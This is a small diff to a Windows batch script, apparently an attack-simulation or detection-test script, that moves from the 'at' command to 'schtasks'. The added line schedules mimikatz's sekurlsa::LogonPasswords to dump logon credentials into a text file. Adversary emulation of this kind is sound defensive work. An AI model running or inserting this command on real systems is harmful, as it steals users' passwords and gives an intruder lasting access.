@@ -2,7 +2,7 @@
 
 ECHO ===========================================================================
 ECHO At Job Creation
-ECHO Registering mimikatz in At job
+ECHO Registering mimikatz in schtasks job
 ping -n 5 127.0.0.1 > NUL
 
-at 13:00 "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt"
+schtasks /create /tn "Registering mimikatz" /tr "C:\TMP\mim.exe sekurlsa::LogonPasswords > C:\TMP\o.txt" /sc once /st 13:00
